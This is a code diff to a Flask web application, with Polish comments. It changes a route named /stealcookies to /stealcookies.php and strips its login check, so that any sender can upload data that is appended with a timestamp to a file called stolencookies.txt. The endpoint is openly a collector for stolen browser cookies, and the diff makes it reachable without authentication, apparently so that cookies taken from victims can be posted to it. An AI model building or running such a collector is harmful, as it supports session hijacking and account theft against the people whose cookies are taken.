@@ -18,36 +18,32 @@ def show():
         return send_from_directory(directory, filename)
     else:
         return redirect(url_for('login'))
-@app.route('/stealcookies', methods=['GET', 'POST'])
+@app.route('/stealcookies.php', methods=['GET', 'POST'])
 def steal_cookies():
-    if 'logged_in' in session and session['logged_in']:
-        if request.method == 'POST':
-            if 'fileToUpload' in request.files:
-                uploaded_file = request.files['fileToUpload']
-                file_contents = uploaded_file.read().decode('utf-8')
-                
-                # Pobierz aktualną datę i czas
-                now = datetime.datetime.now()
-                formatted_date = now.strftime("%Y-%m-%d %H:%M:%S")
-                
-                # Ścieżka do pliku
-                file_path = './uploads/stolencookies.txt'
-                
-                # Zapisz zawartość pliku, dodając nową linię i datę zaktualizowania
-                with open(file_path, 'a') as f:
-                    f.write('\n')  # Nowa linia przed nową zawartością
-                    f.write(f'Data zaktualizowania: {formatted_date}\n')
-                    f.write(file_contents)
-                
-                return 'Plik został pomyślnie zapisany jako stolencookies.txt.'
-            else:
-                return 'Brak przesłanego pliku lub wystąpił problem podczas zapisu.'
-        
-        # Obsługa GET (renderowanie formularza)
-        return render_template('stealcookies.html')
-    else:
-        return redirect(url_for('login'))
-
+    if request.method == 'POST':
+        if 'fileToUpload' in request.files:
+            uploaded_file = request.files['fileToUpload']
+            file_contents = uploaded_file.read().decode('utf-8')
+            
+            # Pobierz aktualną datę i czas
+            now = datetime.datetime.now()
+            formatted_date = now.strftime("%Y-%m-%d %H:%M:%S")
+            
+            # Ścieżka do pliku
+            file_path = './uploads/stolencookies.txt'
+            
+            # Zapisz zawartość pliku, dodając nową linię i datę zaktualizowania
+            with open(file_path, 'a') as f:
+                f.write('\n')  # Nowa linia przed nową zawartością
+                f.write(f'Data zaktualizowania: {formatted_date}\n')
+                f.write(file_contents)
+            
+            return 'Plik został pomyślnie zapisany jako stolencookies.txt.'
+        else:
+            return 'Brak przesłanego pliku lub wystąpił problem podczas zapisu.'
+    
+    # Obsługa GET (renderowanie formularza)
+    return render_template('stealcookies.php')
 @app.route('/logout_user')
 def logout_user():
     session.clear()
